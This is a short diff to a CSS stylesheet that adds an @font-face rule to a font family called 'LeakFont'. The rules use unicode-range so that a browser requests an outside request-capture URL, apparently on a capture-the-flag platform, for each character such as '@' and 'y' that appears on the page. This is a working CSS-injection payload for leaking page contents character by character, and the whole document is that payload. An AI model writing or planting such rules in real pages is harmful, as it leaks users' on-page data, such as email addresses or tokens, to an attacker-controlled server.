@@ -8,6 +8,12 @@
 
 @font-face {
     font-family: 'LeakFont';
+    src: url('https://vwbekpz.request.dreamhack.games/?leak=@');
+    unicode-range: U+0040; /* @ */
+}
+
+@font-face {
+    font-family: 'LeakFont';
     src: url('https://vwbekpz.request.dreamhack.games/?leak=y');
     unicode-range: U+0079; /* y */
 }
